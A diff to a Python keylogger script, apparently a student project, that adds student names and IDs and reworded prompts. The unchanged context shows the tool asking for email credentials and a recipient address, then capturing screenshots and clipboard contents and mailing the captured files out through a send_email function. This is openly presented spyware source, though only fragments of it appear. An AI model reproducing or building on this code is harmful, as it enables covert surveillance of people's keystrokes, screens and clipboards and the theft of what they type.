@@ -1,3 +1,6 @@
+#Youssef omar- 202000365
+#Catherine Medhat- 202001102
+#Ali Abdelhamid- 202100274
 # Libraries
 # Sending mail
 from email.mime.multipart import MIMEMultipart
@@ -33,21 +36,21 @@ clipboard_information_e = "e_clipboard.txt"
 # Iterations controls 
 time_iteration = 60
 number_of_iterations_end = 3
-print("welcome to the keylogger")
+print("Welcome to our keylogger ツ")
 # Sender email and password
-email_address = input("please enter user email")# Enter disposable email here
-password = input("please enter password")# Enter email password here
+email_address = input("Please enter user email: ")# Enter disposable email here
+password = input("Please enter password: ")# Enter email password here
 
 username = getpass.getuser()
 
-toaddr = input("please enter email to send files to") # Enter the email address you want to send your information to
+toaddr = input("Please enter email to send files to: ") # Enter the email address you want to send your information to
 
-key = input("please enter encryption key") # Generate an encryption key from the Cryptography folder
+key = input("Please enter encryption key: ") # Generate an encryption key from the Cryptography folder
 
-file_path = input("please enter file path") # Enter the file path you want your files to be saved to
+file_path = input("Please enter file path: ") # Enter the file path you want your files to be saved to
 extend = "\\"
 file_merge = file_path + extend
-
+print("Start typing")
 # Email controls
 def send_email(filename, attachment, toaddr):
 
@@ -177,7 +180,6 @@ if currentTime > stoppingTime:
         f.write(" ")
 
     screenshot()
-    print('sending email')
     
     copy_clipboard()
 
